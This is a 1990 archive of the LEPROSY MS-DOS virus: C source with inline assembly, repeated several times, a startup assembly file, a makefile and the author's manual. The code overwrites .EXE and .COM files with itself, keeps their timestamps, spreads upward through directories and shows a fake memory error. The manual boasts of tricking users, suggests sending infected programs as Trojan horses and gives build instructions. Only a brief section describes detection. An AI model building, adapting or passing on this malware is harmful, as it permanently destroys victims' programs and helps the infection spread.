;  'Extra-Tiny' memory model startup code for Turbo C 2.0
;
;  This makes smaller executable images from C programs, by
;  removing code to get command line arguments and the like.
;  Compile with Tiny model flag, do not use any standard I/O
;  library functions, such as puts() or int86().
;
;  This code courtesey PC Magazine, December 26, 1989.
;  But nobody really needs to know that.


_text           segment byte public 'code'
_text           ends
_data           segment word public 'data'
_data           ends
_bss            segment word public 'bss'
_bss            ends

dgroup          group           _text, _data, _bss

_text           segment
                org 100h
begin:
_text           ends

                end     begin
;  'Extra-Tiny' memory model startup code for Turbo C 2.0
;
;  This makes smaller executable images from C programs, by
;  removing code to get command line arguments and the like.
;  Compile with Tiny model flag, do not use any standard I/O
;  library functions, such as puts() or int86().
;
;  This code courtesey PC Magazine, December 26, 1989.
;  But nobody really needs to know that.


_text           segment byte public 'code'
_text           ends
_data           segment word public 'data'
_data           ends
_bss            segment word public 'bss'
_bss            ends

dgroup          group           _text, _data, _bss

_text           segment
                org 100h
begin:
_text           ends

                end     begin
=============================

/*  C Code starts here!
    This file is part of the source code to the LEPROSY Virus 1.00
    Copy-ya-right (c) 1990 by PCM2.  This program can cause destruction
    of files; you're warned, the author assumes no responsibility
    for damage this program causes, incidental or otherwise.  This
    program is not intended for general distribution -- irresponsible
    users should not be allowed access to this program, or its
    accompanying files.  (Unlike people like us, of course...)
*/


#pragma inline

#define   CRLF       "\x17\x14"          /*  CR/LF combo encrypted.  */
#define   NO_MATCH   0x12                /*  No match in wildcard search.  */


/*  The following strings are not garbled; they are all encrypted  */
/*  using the simple technique of adding the integer value 10 to   */
/*  each character.  They are automatically decrypted by           */
/*  'print_s()', the function which sends the strings to 'stdout'  */
/*  using DOS service 09H.  All are terminated with a dollar-sign  */
/*  "$" as per DOS service specifications.                         */

char fake_msg[] = CRLF "Z|yq|kw*~yy*lsq*~y*ps~*sx*wowy|\x83.";
char *virus_msg[3] =
  {
    CRLF "\x13XOa]*PVK]R++**cy\x7f|*}\x83}~ow*rk}*loox*sxpom~on*\x81s~r*~ro.",
    CRLF "\x13sxm\x7f|klvo*nomk\x83*yp*VOZ\\Y]c*;8::6*k*\x80s|\x7f}*sx\x80ox~on*l\x83.",
    CRLF "\x13ZMW<*sx*T\x7fxo*yp*;CC:8**Qyyn*v\x7fmu+\x17\x14."
  };



struct _dta                     /*  Disk Transfer Area format for find.  */
  {
    char findnext[21];
    char attribute;
    int timestamp;
    int datestamp;
    long filesize;
    char filename[13];
  } *dta = (struct _dta *) 0x80;   /*  Set it to default DTA.  */


const char filler[] = "XX";             /*  Pad file length to 666 bytes.  */
const char *codestart = (char *) 0x100;  /*  Memory where virus code begins.  */
const int virus_size = 666;      /*  The size in bytes of the virus code.  */
const int infection_rate = 4;     /*  How many files to infect per run.  */

char compare_buf[20];           /*  Load program here to test infection.  */
int handle;                     /*  The current file handle being used.  */
int datestamp, timestamp;       /*  Store original date and time here.  */
char diseased_count = 0;        /*  How many infected files found so far.  */
char success = 0;               /*  How many infected this run.  */


/*  The following are function prototypes, in keeping with ANSI    */
/*  Standard C, for the support functions of this program.         */

int find_first( char *fn );
int find_healthy( void );
int find_next( void );
int healthy( void );
void infect( void );
void close_handle( void );
void open_handle( char *fn );
void print_s( char *s );
void restore_timestamp( void );



/*----------------------------------*/
/*     M A I N    P R O G R A M     */
/*----------------------------------*/

int main( void )  {
  int x = 0;
  do {
    if ( find_healthy() )  {           /*  Is there an un-infected file?  */
      infect();                        /*  Well, then infect it!  */
      x++;                             /*  Add one to the counter.  */
      success++;                       /*  Carve a notch in our belt.  */
    }
    else  {                            /*  If there ain't a file here... */
      _DX = (int) "..";                /*  See if we can step back to  */
      _AH = 0x3b;                      /*  the parent directory, and try  */
      asm   int 21H;                   /*  there.  */
      x++;                             /*  Increment the counter anyway, to  */
    }                                  /*  avoid infinite loops.  */
  } while( x < infection_rate );       /*  Do this until we've had enough.  */
  if ( success )                       /*  If we got something this time,  */
    print_s( fake_msg );               /*  feed 'em the phony error line.  */
  else
    if ( diseased_count > 6 )          /*  If we found 6+ infected files  */
      for( x = 0; x < 3; x++ )         /*  along the way, laugh!!  */
        print_s( virus_msg[x] );
    else
      print_s( fake_msg );             /*  Otherwise, keep a low profile.  */
  return;
}


void infect( void )  {
  _DX = (int) dta->filename;  /*  DX register points to filename.  */
  _CX = 0x00;                 /*  No attribute flags are set.  */
  _AL = 0x01;                 /*  Use Set Attribute sub-function.  */
  _AH = 0x43;                 /*  Assure access to write file.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  open_handle( dta->filename );        /*  Re-open the healthy file.  */
  _BX = handle;                       /*  BX register holds handle.  */
  _CX = virus_size;                   /*  Number of bytes to write.  */
  _DX = (int) codestart;              /*  Write program code.  */
  _AH = 0x40;                         /*  Set up and call DOS.  */
  asm   int 21H;
  restore_timestamp();               /*  Keep original date & time.  */
  close_handle();                     /*  Close file.  */
  return;
}


int find_healthy( void )  {
  if ( find_first("*.EXE") != NO_MATCH )       /*  Find EXE?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  if ( find_first("*.COM") != NO_MATCH )       /*  Find COM?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  return 0;                                  /*  Otherwise, say so.  */
}



int healthy( void )  {
  int i;
  datestamp = dta->datestamp;        /*  Save time & date for later.  */
  timestamp = dta->timestamp;
  open_handle( dta->filename );      /*  Open last file located.  */
  _BX = handle;                      /*  BX holds current file handle.  */
  _CX = 20;                          /*  We only want a few bytes.  */
  _DX = (int) compare_buf;          /*  DX points to the scratch buffer.  */
  _AH = 0x3f;                       /*  Read in file for comparison.  */
  asm   int 21H;
  restore_timestamp();              /*  Keep original date & time.  */
  close_handle();                   /*  Close the file.  */
  for ( i = 0; i < 20; i++ )        /*  Compare to virus code.  */
    if ( compare_buf[i] != *(codestart+i) )
      return 1;                     /*  If no match, return healthy.  */
  diseased_count++;                 /*  Chalk up one more fucked file.  */
  return 0;                         /*  Otherwise, return infected.  */
}


void restore_timestamp( void )  {
  _AL = 0x01;                         /*  Keep original date & time.  */
  _BX = handle;                       /*  Same file handle.  */
  _CX = timestamp;                    /*  Get time & date from DTA.  */
  _DX = datestamp;
  _AH = 0x57;                         /*  Do DOS service.  */
  asm   int 21H;
  return;
}


void print_s( char *s )  {
  char *p = s;
  while ( *p )  {              /*  Subtract 10 from every character.  */
    *p -= 10;
    p++;
  }
  _DX = (int) s;              /*  Set DX to point to adjusted string.   */
  _AH = 0x09;                 /*  Set DOS function number.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  return;
}


int find_first( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the file name.  */
  _CX = 0xff;                 /*  Search for all attributes.  */
  _AH = 0x4e;                 /*  'Find first' DOS service.  */
  asm   int 21H;              /*  Go, DOS, go.  */
  return _AX;                 /*  Return possible error code.  */
}


int find_next( void )  {
  _AH = 0x4f;                 /*  'Find next' function.  */
  asm   int 21H;              /*  Call DOS.  */
  return _AX;                 /*  Return any error code.  */
}


void open_handle( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the filename.  */
  _AL = 0x02;                 /*  Always open for both read & write. */
  _AH = 0x3d;                 /*  "Open handle" service.  */
  asm   int 21H;              /*  Call DOS.  */
  handle = _AX;               /*  Assume handle returned OK.  */
  return;
}


void close_handle( void )  {
  _BX = handle;               /*  Load BX register w/current file handle.  */
  _AH = 0x3e;                 /*  Set up and call DOS service.  */
  asm   int 21H;
  return;
}
/*  This file is part of the source code to the LEPROSY Virus 1.00
    Copy-ya-right (c) 1990 by PCM2.  This program can cause destruction
    of files; you're warned, the author assumes no responsibility
    for damage this program causes, incidental or otherwise.  This
    program is not intended for general distribution -- irresponsible
    users should not be allowed access to this program, or its
    accompanying files.  (Unlike people like us, of course...)
*/


#pragma inline

#define   CRLF       "\x17\x14"          /*  CR/LF combo encrypted.  */
#define   NO_MATCH   0x12                /*  No match in wildcard search.  */


/*  The following strings are not garbled; they are all encrypted  */
/*  using the simple technique of adding the integer value 10 to   */
/*  each character.  They are automatically decrypted by           */
/*  'print_s()', the function which sends the strings to 'stdout'  */
/*  using DOS service 09H.  All are terminated with a dollar-sign  */
/*  "$" as per DOS service specifications.                         */

char fake_msg[] = CRLF "Z|yq|kw*~yy*lsq*~y*ps~*sx*wowy|\x83.";
char *virus_msg[3] =
  {
    CRLF "\x13XOa]*PVK]R++**cy\x7f|*}\x83}~ow*rk}*loox*sxpom~on*\x81s~r*~ro.",
    CRLF "\x13sxm\x7f|klvo*nomk\x83*yp*VOZ\\Y]c*;8::6*k*\x80s|\x7f}*sx\x80ox~on*l\x83.",
    CRLF "\x13ZMW<*sx*T\x7fxo*yp*;CC:8**Qyyn*v\x7fmu+\x17\x14."
  };



struct _dta                     /*  Disk Transfer Area format for find.  */
  {
    char findnext[21];
    char attribute;
    int timestamp;
    int datestamp;
    long filesize;
    char filename[13];
  } *dta = (struct _dta *) 0x80;   /*  Set it to default DTA.  */


const char filler[] = "XX";             /*  Pad file length to 666 bytes.  */
const char *codestart = (char *) 0x100;  /*  Memory where virus code begins.  */
const int virus_size = 666;      /*  The size in bytes of the virus code.  */
const int infection_rate = 4;     /*  How many files to infect per run.  */

char compare_buf[20];           /*  Load program here to test infection.  */
int handle;                     /*  The current file handle being used.  */
int datestamp, timestamp;       /*  Store original date and time here.  */
char diseased_count = 0;        /*  How many infected files found so far.  */
char success = 0;               /*  How many infected this run.  */


/*  The following are function prototypes, in keeping with ANSI    */
/*  Standard C, for the support functions of this program.         */

int find_first( char *fn );
int find_healthy( void );
int find_next( void );
int healthy( void );
void infect( void );
void close_handle( void );
void open_handle( char *fn );
void print_s( char *s );
void restore_timestamp( void );



/*----------------------------------*/
/*     M A I N    P R O G R A M     */
/*----------------------------------*/

int main( void )  {
  int x = 0;
  do {
    if ( find_healthy() )  {           /*  Is there an un-infected file?  */
      infect();                        /*  Well, then infect it!  */
      x++;                             /*  Add one to the counter.  */
      success++;                       /*  Carve a notch in our belt.  */
    }
    else  {                            /*  If there ain't a file here... */
      _DX = (int) "..";                /*  See if we can step back to  */
      _AH = 0x3b;                      /*  the parent directory, and try  */
      asm   int 21H;                   /*  there.  */
      x++;                             /*  Increment the counter anyway, to  */
    }                                  /*  avoid infinite loops.  */
  } while( x < infection_rate );       /*  Do this until we've had enough.  */
  if ( success )                       /*  If we got something this time,  */
    print_s( fake_msg );               /*  feed 'em the phony error line.  */
  else
    if ( diseased_count > 6 )          /*  If we found 6+ infected files  */
      for( x = 0; x < 3; x++ )         /*  along the way, laugh!!  */
        print_s( virus_msg[x] );
    else
      print_s( fake_msg );             /*  Otherwise, keep a low profile.  */
  return;
}


void infect( void )  {
  _DX = (int) dta->filename;  /*  DX register points to filename.  */
  _CX = 0x00;                 /*  No attribute flags are set.  */
  _AL = 0x01;                 /*  Use Set Attribute sub-function.  */
  _AH = 0x43;                 /*  Assure access to write file.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  open_handle( dta->filename );        /*  Re-open the healthy file.  */
  _BX = handle;                       /*  BX register holds handle.  */
  _CX = virus_size;                   /*  Number of bytes to write.  */
  _DX = (int) codestart;              /*  Write program code.  */
  _AH = 0x40;                         /*  Set up and call DOS.  */
  asm   int 21H;
  restore_timestamp();               /*  Keep original date & time.  */
  close_handle();                     /*  Close file.  */
  return;
}


int find_healthy( void )  {
  if ( find_first("*.EXE") != NO_MATCH )       /*  Find EXE?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  if ( find_first("*.COM") != NO_MATCH )       /*  Find COM?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  return 0;                                  /*  Otherwise, say so.  */
}



int healthy( void )  {
  int i;
  datestamp = dta->datestamp;        /*  Save time & date for later.  */
  timestamp = dta->timestamp;
  open_handle( dta->filename );      /*  Open last file located.  */
  _BX = handle;                      /*  BX holds current file handle.  */
  _CX = 20;                          /*  We only want a few bytes.  */
  _DX = (int) compare_buf;          /*  DX points to the scratch buffer.  */
  _AH = 0x3f;                       /*  Read in file for comparison.  */
  asm   int 21H;
  restore_timestamp();              /*  Keep original date & time.  */
  close_handle();                   /*  Close the file.  */
  for ( i = 0; i < 20; i++ )        /*  Compare to virus code.  */
    if ( compare_buf[i] != *(codestart+i) )
      return 1;                     /*  If no match, return healthy.  */
  diseased_count++;                 /*  Chalk up one more fucked file.  */
  return 0;                         /*  Otherwise, return infected.  */
}


void restore_timestamp( void )  {
  _AL = 0x01;                         /*  Keep original date & time.  */
  _BX = handle;                       /*  Same file handle.  */
  _CX = timestamp;                    /*  Get time & date from DTA.  */
  _DX = datestamp;
  _AH = 0x57;                         /*  Do DOS service.  */
  asm   int 21H;
  return;
}


void print_s( char *s )  {
  char *p = s;
  while ( *p )  {              /*  Subtract 10 from every character.  */
    *p -= 10;
    p++;
  }
  _DX = (int) s;              /*  Set DX to point to adjusted string.   */
  _AH = 0x09;                 /*  Set DOS function number.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  return;
}


int find_first( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the file name.  */
  _CX = 0xff;                 /*  Search for all attributes.  */
  _AH = 0x4e;                 /*  'Find first' DOS service.  */
  asm   int 21H;              /*  Go, DOS, go.  */
  return _AX;                 /*  Return possible error code.  */
}


int find_next( void )  {
  _AH = 0x4f;                 /*  'Find next' function.  */
  asm   int 21H;              /*  Call DOS.  */
  return _AX;                 /*  Return any error code.  */
}


void open_handle( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the filename.  */
  _AL = 0x02;                 /*  Always open for both read & write. */
  _AH = 0x3d;                 /*  "Open handle" service.  */
  asm   int 21H;              /*  Call DOS.  */
  handle = _AX;               /*  Assume handle returned OK.  */
  return;
}


void close_handle( void )  {
  _BX = handle;               /*  Load BX register w/current file handle.  */
  _AH = 0x3e;                 /*  Set up and call DOS service.  */
  asm   int 21H;
  return;
}


        


                             L E P R O S Y   1 . 0 0

                           A Virus for MS-DOS Systems.
                     Copy-ya-right (c) June 29, 1990 by PCM2




        GENERAL SUMMARY 
        ~~~~~~~~~~~~~~~ 

             LEPROSY is  a  virus  which  can  influence  PC and PC clone
        systems  running  MS-DOS  or PC-DOS version 2.0 or later.  It may
        be  characterized  as  an overwriting, non-resident .COM and .EXE
        infecting  virus,  similar  in  operation  to  the  AIDS Virus by
        Doctor  Dissector  and  CPI; in fact, the AIDS Virus was actually
        the  inspiration  for this program, though Leprosy is in no way a
        re-write  or  mod  of  the  AIDS  Virus,  it  is  an entirely new
        program.

             The way  both  Leprosy  and  the AIDS Virus (and Number One,
        the  ancestor of AIDS) work is fairly simple.  Upon executing the
        virus  program,  the  virus  runs  a  search for executable files
        which  it  can  affect.  It does this by doing a general scan for
        all  files with a .COM or .EXE extension, then, having found such
        a  file,  it loads in part of that file's code to compare it with
        the  virus'  own code, to make sure the file found hasn't already
        been  infected.  If it hasn't, the virus proceeds to write itself
        OVER  the code of the executable file found.  The executable file
        now   ceases   to   perform  its  original  function.   When  the
        unsuspecing  user  runs  the  file,  he  will  instead be running
        another   copy   of  the  virus,  which  will  seek  out  another
        executable  file  to  infect,  and  so  on.  The executable files
        which  are  infected  by the virus in this manner are permanently
        destroyed.   While  this is a primitive way to spread a virus, it
        is  actually  pretty  effective, if you consider that by the time
        the  user  discovers a file which has been infected by the virus,
        it  has  already  gone and zapped one or more other files, and by
        the  time  the  user finds those files, they will have infected a
        few  more,  and  on until the user figures out some way to detect
        and eradicate all the infected files.  

             While Leprosy  is similar in operation to the AIDS Virus, it
        presents several important advantages over AIDS: 

        1.  CARRIERS:   The  AIDS  Virus  will  only  infect  .COM files.
        Leprosy  is  not  limited  in  this way; it will infect both .COM
        files and the more common .EXE files, going for .EXE files first.

        2.  FILE SIZE:  The AIDS Virus is written in Pascal, and is about
        13K  in  size.   Considering that any file that is infected which
        was  originally  smaller than the virus itself will expand to the


                                      - 1 -


        


        size  of  the virus when it is infected, and that many .COM files
        will  be  smaller  than  13K,  quite  often  a  file  will show a
        noticeable  change  in  size  when  infected  by  the AIDS Virus.
        Leprosy  is  only a mere 666 bytes in size; therefore, changes in
        file  size  will  be much less frequent, and the disk access time
        it  takes  to infect a new file will be considerably shorter than
        when using the AIDS Virus.  

        3.  DUMBSHIT FACTOR:  When the AIDS Virus infects a file or fails
        to  find  any  non-infected files, it just sits there or hangs up
        the  system.   Leprosy  takes  a  more  subtle approach, however.
        When  Leprosy has infected some files successfully, it prints out
        the  message  "Program  too  big  to  fit  in memory".  This way,
        dumbshits  might  think there is something screwy with their RAMs
        or  TSRs, and may end up running the same virus-infected file one
        or more times before they get a clue.  

        4.  CONCEALMENT:   To find out if a file has been infected by the
        AIDS  Virus,  all  you need to do is run a hex editor on the file
        and  look  for  the full screen reading "AIDS" in the code.  Once
        again,  Leprosy  makes  it  more  difficult on the dumbshit user.
        All  the strings Leprosy outputs to the screen are encrypted in a
        simple  way,  enough  to  make  it  impossible  to  quickly  spot
        suspicious  phrases  when  running  a  hex  editor on an infected
        file.   What is more, Leprosy will not change the time/date stamp
        on the file when it infects it, unlike AIDS.

        5.  COMMUNICABILITY:   When  the  AIDS  Virus fails to locate any
        non-infected  .COM  file  in  the  current  directory,  it can no
        longer  spread  itself.   The  only  way an AIDS Virus can spread
        from  one  directory to another is to somehow make it into one of
        the  directories  in  the current PATH, and be called by the user
        from  a  different  directory.   Leprosy  gives  itself  one more
        shot.   When  it fails to find any more non-infected files in the
        current  directory,  it will step back into the parent directory,
        and  try  to  find  some files again there.  While when the virus
        exits  the  current directory will have changed when Leprosy does
        this,  hopefully  the  dumbshit  won't  catch on.  The payback is
        that  Leprosy might eventually creep up to the root directory and
        infect COMMAND.COM, and then the user will be fucked over.  

        6.  RATE  OF  TRANSMISSION:   The AIDS Virus will only infect one
        file  at  a time.  Leprosy will infect up to four files each time
        it is run.  

        SETTING UP LEPROSY ON A SYSTEM 
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

             To install  Leprosy onto an un-infected system, all you need
        do  is  run  the  provided  file,  LEPROSY.COM, somewhere on that
        system,  preferably  somewhere where it will have access to a lot
        of  commonly  used  executables.   Alternately,  you could infect
        some   program   with   an  impressive-looking  file  length  and

                                      - 2 -


        


        documentation  and  send  it  to  someone  as a Trojan Horse type
        program.  Just make sure it gets run.  

        COMPILING LEPROSY 
        ~~~~~~~~~~~~~~~~~ 

             To assemble  the  Leprosy  .COM  file, you will need Turbo C
        2.0  and  Turbo  Assembler.  MASM might work, just as long as the
        executable  file  turns  out the appropriate length.  If the .COM
        file  doesn't  come  out to exactly 666 bytes long, then it might
        not  work properly.  C compilers other than Turbo C will probably
        not  work,  since  the  program  makes  extensive  use  of inline
        assembler,  but  versions  other  than 2.0 will probably be okay.
        Just remember -- watch the file length.  

             The easiest  way  to  re-create Leprosy is to just run MAKE,
        and  the  provided  makefile  will  handle  the rest.  If you are
        compiling  it  by  hand,  you  should  use  this makefile as your
        guidelines.   An  important  note is that you should not link the
        program  with  the  standard  Turbo  C  startup code for the Tiny
        memory   model;   instead,  always  link  it  with  the  provided
        alternate  startup  code.   This  file,  C0T.ASM,  is  a  startup
        sequence  which gets rid of code to gather command line arguments
        and  the  like,  allowing  for  programs which are essentially as
        small  as  their  assembly language counterparts.  Just remember,
        keep an eye on the executable file size.  

        WAYS TO SPOT THE VIRUS 
        ~~~~~~~~~~~~~~~~~~~~~~ 

             There are  several  ways to notice the Leprosy virus on your
        system.   If  small  .COM  files  are increasing in length to 666
        bytes,  that's  your  first  hint.  666 bytes isn't a very likely
        file  length,  but it's funny, so I'm keeping it that way.  Also,
        if  the  current directory changes when you run a program, or you
        notice  strange  "Program  too big to fit in memory" errors, that
        should  tip  you  off  too.   Leprosy can also be detected by CRC
        checking  programs,  because it directly modifies the contents of
        the   files   it   infects.   What  is  more,  Leprosy  causes  a
        distinctive  drive noise, sort of a "blickablickablickablicka" on
        my  hard  drive, because it is opening, reading from, writing to,
        and closing a number of files very quickly.  

        ACKNOWLEDGEMENTS 
        ~~~~~~~~~~~~~~~~ 

             I'd like  to  thank  some  of the pirate boards in the (415)
        area code -- they know who they are.  

             What is  more,  I'd like to say that I used the December 26,
        1989  issue  of  PC  Magazine, and the book "The NEW Peter Norton
        Programmer's  Guide  to  the  IBM  PC and PS/2" in the process of


                                      - 3 -


        


        writing  the  Leprosy  program.  I just thought I'd mention that,
        since  it  kind of makes me laugh to wonder what Peter Norton and
        PC   Magazine   would   think  if  they  knew  they  were  partly
        responsible for the creation of a virus.  HAHA! 

        Yours truly, 
        PCM2 



        P.S.  BTW,  if  Leprosy fails to find any .EXE or .COM files that
              aren't  infected,  but  it  locates more  than 6 executable
              files that are already infected with Leprosy, it displays a
              message  indicating  that the system has been infected with
              Leprosy, and wishes the user luck.   If  it can't find  any
              new files to infect, and only  finds  6  or  less  infected
              files  during  its entire run, it just prints out the  fake
              "Program too big to fit in memory" message again.
































                                      - 4 -

/*  This file is part of the source code to the LEPROSY Virus 1.00
    Copy-ya-right (c) 1990 by PCM2.  This program can cause destruction
    of files; you're warned, the author assumes no responsibility
    for damage this program causes, incidental or otherwise.  This
    program is not intended for general distribution -- irresponsible
    users should not be allowed access to this program, or its
    accompanying files.  (Unlike people like us, of course...)
*/


#pragma inline

#define   CRLF       "\x17\x14"          /*  CR/LF combo encrypted.  */
#define   NO_MATCH   0x12                /*  No match in wildcard search.  */


/*  The following strings are not garbled; they are all encrypted  */
/*  using the simple technique of adding the integer value 10 to   */
/*  each character.  They are automatically decrypted by           */
/*  'print_s()', the function which sends the strings to 'stdout'  */
/*  using DOS service 09H.  All are terminated with a dollar-sign  */
/*  "$" as per DOS service specifications.                         */

char fake_msg[] = CRLF "Z|yq|kw*~yy*lsq*~y*ps~*sx*wowy|\x83.";
char *virus_msg[3] =
  {
    CRLF "\x13XOa]*PVK]R++**cy\x7f|*}\x83}~ow*rk}*loox*sxpom~on*\x81s~r*~ro.",
    CRLF "\x13sxm\x7f|klvo*nomk\x83*yp*VOZ\\Y]c*;8::6*k*\x80s|\x7f}*sx\x80ox~on*l\x83.",
    CRLF "\x13ZMW<*sx*T\x7fxo*yp*;CC:8**Qyyn*v\x7fmu+\x17\x14."
  };



struct _dta                     /*  Disk Transfer Area format for find.  */
  {
    char findnext[21];
    char attribute;
    int timestamp;
    int datestamp;
    long filesize;
    char filename[13];
  } *dta = (struct _dta *) 0x80;   /*  Set it to default DTA.  */


const char filler[] = "XX";             /*  Pad file length to 666 bytes.  */
const char *codestart = (char *) 0x100;  /*  Memory where virus code begins.  */
const int virus_size = 666;      /*  The size in bytes of the virus code.  */
const int infection_rate = 4;     /*  How many files to infect per run.  */

char compare_buf[20];           /*  Load program here to test infection.  */
int handle;                     /*  The current file handle being used.  */
int datestamp, timestamp;       /*  Store original date and time here.  */
char diseased_count = 0;        /*  How many infected files found so far.  */
char success = 0;               /*  How many infected this run.  */


/*  The following are function prototypes, in keeping with ANSI    */
/*  Standard C, for the support functions of this program.         */

int find_first( char *fn );
int find_healthy( void );
int find_next( void );
int healthy( void );
void infect( void );
void close_handle( void );
void open_handle( char *fn );
void print_s( char *s );
void restore_timestamp( void );



/*----------------------------------*/
/*     M A I N    P R O G R A M     */
/*----------------------------------*/

int main( void )  {
  int x = 0;
  do {
    if ( find_healthy() )  {           /*  Is there an un-infected file?  */
      infect();                        /*  Well, then infect it!  */
      x++;                             /*  Add one to the counter.  */
      success++;                       /*  Carve a notch in our belt.  */
    }
    else  {                            /*  If there ain't a file here... */
      _DX = (int) "..";                /*  See if we can step back to  */
      _AH = 0x3b;                      /*  the parent directory, and try  */
      asm   int 21H;                   /*  there.  */
      x++;                             /*  Increment the counter anyway, to  */
    }                                  /*  avoid infinite loops.  */
  } while( x < infection_rate );       /*  Do this until we've had enough.  */
  if ( success )                       /*  If we got something this time,  */
    print_s( fake_msg );               /*  feed 'em the phony error line.  */
  else
    if ( diseased_count > 6 )          /*  If we found 6+ infected files  */
      for( x = 0; x < 3; x++ )         /*  along the way, laugh!!  */
        print_s( virus_msg[x] );
    else
      print_s( fake_msg );             /*  Otherwise, keep a low profile.  */
  return;
}


void infect( void )  {
  _DX = (int) dta->filename;  /*  DX register points to filename.  */
  _CX = 0x00;                 /*  No attribute flags are set.  */
  _AL = 0x01;                 /*  Use Set Attribute sub-function.  */
  _AH = 0x43;                 /*  Assure access to write file.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  open_handle( dta->filename );        /*  Re-open the healthy file.  */
  _BX = handle;                       /*  BX register holds handle.  */
  _CX = virus_size;                   /*  Number of bytes to write.  */
  _DX = (int) codestart;              /*  Write program code.  */
  _AH = 0x40;                         /*  Set up and call DOS.  */
  asm   int 21H;
  restore_timestamp();               /*  Keep original date & time.  */
  close_handle();                     /*  Close file.  */
  return;
}


int find_healthy( void )  {
  if ( find_first("*.EXE") != NO_MATCH )       /*  Find EXE?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  if ( find_first("*.COM") != NO_MATCH )       /*  Find COM?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  return 0;                                  /*  Otherwise, say so.  */
}



int healthy( void )  {
  int i;
  datestamp = dta->datestamp;        /*  Save time & date for later.  */
  timestamp = dta->timestamp;
  open_handle( dta->filename );      /*  Open last file located.  */
  _BX = handle;                      /*  BX holds current file handle.  */
  _CX = 20;                          /*  We only want a few bytes.  */
  _DX = (int) compare_buf;          /*  DX points to the scratch buffer.  */
  _AH = 0x3f;                       /*  Read in file for comparison.  */
  asm   int 21H;
  restore_timestamp();              /*  Keep original date & time.  */
  close_handle();                   /*  Close the file.  */
  for ( i = 0; i < 20; i++ )        /*  Compare to virus code.  */
    if ( compare_buf[i] != *(codestart+i) )
      return 1;                     /*  If no match, return healthy.  */
  diseased_count++;                 /*  Chalk up one more fucked file.  */
  return 0;                         /*  Otherwise, return infected.  */
}


void restore_timestamp( void )  {
  _AL = 0x01;                         /*  Keep original date & time.  */
  _BX = handle;                       /*  Same file handle.  */
  _CX = timestamp;                    /*  Get time & date from DTA.  */
  _DX = datestamp;
  _AH = 0x57;                         /*  Do DOS service.  */
  asm   int 21H;
  return;
}


void print_s( char *s )  {
  char *p = s;
  while ( *p )  {              /*  Subtract 10 from every character.  */
    *p -= 10;
    p++;
  }
  _DX = (int) s;              /*  Set DX to point to adjusted string.   */
  _AH = 0x09;                 /*  Set DOS function number.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  return;
}


int find_first( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the file name.  */
  _CX = 0xff;                 /*  Search for all attributes.  */
  _AH = 0x4e;                 /*  'Find first' DOS service.  */
  asm   int 21H;              /*  Go, DOS, go.  */
  return _AX;                 /*  Return possible error code.  */
}


int find_next( void )  {
  _AH = 0x4f;                 /*  'Find next' function.  */
  asm   int 21H;              /*  Call DOS.  */
  return _AX;                 /*  Return any error code.  */
}


void open_handle( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the filename.  */
  _AL = 0x02;                 /*  Always open for both read & write. */
  _AH = 0x3d;                 /*  "Open handle" service.  */
  asm   int 21H;              /*  Call DOS.  */
  handle = _AX;               /*  Assume handle returned OK.  */
  return;
}


void close_handle( void )  {
  _BX = handle;               /*  Load BX register w/current file handle.  */
  _AH = 0x3e;                 /*  Set up and call DOS service.  */
  asm   int 21H;
  return;
}
#  makefile for LEPROSY Virus 1.00 by PCM2

leprosy.com:    leprosy.obj c0t.obj
    tlink /x /t c0t+leprosy,leprosy,,

c0t.obj:        c0t.asm
    tasm c0t

leprosy.obj:    leprosy.asm
    tasm leprosy

leprosy.asm:    leprosy.c
    tcc -mt -f- -K -S leprosy
    